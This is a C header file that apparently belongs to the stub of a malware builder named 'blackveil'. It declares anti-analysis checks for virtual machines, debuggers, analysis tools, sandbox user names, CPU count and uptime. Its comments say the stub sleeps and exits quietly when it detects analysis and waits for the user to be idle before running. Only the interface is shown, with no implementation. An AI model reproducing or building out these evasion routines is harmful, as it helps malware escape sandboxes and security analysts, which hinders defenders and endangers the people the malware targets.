/* blackveil/builder/stub/antianalysis.h */
#ifndef BLACKVEIL_ANTIANALYSIS_H
#define BLACKVEIL_ANTIANALYSIS_H

#include <windows.h>

typedef enum {
    BV_AA_OK = 0,
    BV_AA_VM_ARTIFACTS = 1,
    BV_AA_DEBUGGER     = 2,
    BV_AA_TOOLS        = 3,
    BV_AA_SANDBOX_USER = 4,
    BV_AA_CPU_COUNT    = 5,
    BV_AA_UPTIME       = 6,
} bv_aa_result_t;

/* Returns BV_AA_OK if the run should proceed. Any other value means
 * the stub should sleep and exit without touching the filesystem. */
bv_aa_result_t bv_aa_check(void);

/* Wait until user has been idle for `min_idle_sec`, or give up after
 * `max_wait_sec`. Returns TRUE if idle condition satisfied. */
BOOL bv_aa_wait_idle(DWORD min_idle_sec, DWORD max_wait_sec);

#endif
